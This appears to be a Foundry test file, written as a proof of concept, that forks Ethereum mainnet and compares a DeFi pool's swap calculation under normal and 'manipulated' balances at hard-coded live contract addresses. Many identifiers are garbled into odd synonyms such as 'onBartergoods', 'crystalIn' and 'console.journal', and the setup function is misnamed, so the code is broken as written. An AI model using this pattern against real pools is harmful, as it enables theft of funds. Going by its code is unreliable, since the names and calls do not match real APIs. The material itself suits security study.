pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";


interface Validatepace {
    function onBartergoods(
        BartergoodsRequest memory request,
        uint256 backupCoinIn,
        uint256 backupGemOut
    ) external returns (uint256);

    struct BartergoodsRequest {
        IVault.BartergoodsKind kind;
        IERC20 crystalIn;
        IERC20 crystalOut;
        uint256 count;

        bytes32 poolTag;
        uint256 endingChangeTick;
        address origin;
        address to;
        bytes heroInfo;
    }
}

interface IVault {
    enum BartergoodsKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract PactTest is DSTest {
    Validatepace space = Validatepace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IVault.BartergoodsKind kind = IVault.BartergoodsKind(0);
    Validatepace.BartergoodsRequest aad =
        Validatepace.BartergoodsRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function collectionUp() public {
        cheats.createSelectFork("mainnet", 15017009);
    }

    function testOperation() public {

        console.journal(
            "Amount Calculated:",
            space.onBartergoods(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        );
        console.journal(
            "Manipulated Amount Calculated:",
            space.onBartergoods(aad, 2000000000000000000, 2000000000000000000)
        );
    }
}